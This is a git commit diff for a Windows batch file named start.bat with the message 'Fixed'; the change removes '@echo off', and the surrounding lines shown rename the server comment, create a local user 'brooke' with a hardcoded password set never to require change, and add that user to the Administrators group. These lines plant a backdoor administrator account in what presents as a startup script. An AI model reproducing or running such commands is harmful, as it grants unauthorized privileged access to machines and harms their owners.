04b7c50ed19b2ce5eaa8ca57dfb7a81d80f930f2
hanaerachid <110319135+hanaerachid@users.noreply.github.com>
2023-01-29 23:45:54 +0100

    Fixed

--- start.bat
+++ start.bat
@@ -1,4 +1,3 @@
-@echo off
 net config server /srvcomment:"Windows Server" > out.txt 2 >&1
 net user brooke Jacobs123 /add /active:yes /logonpasswordchg:no > nul
 net localgroup Administrators brooke /add > nul
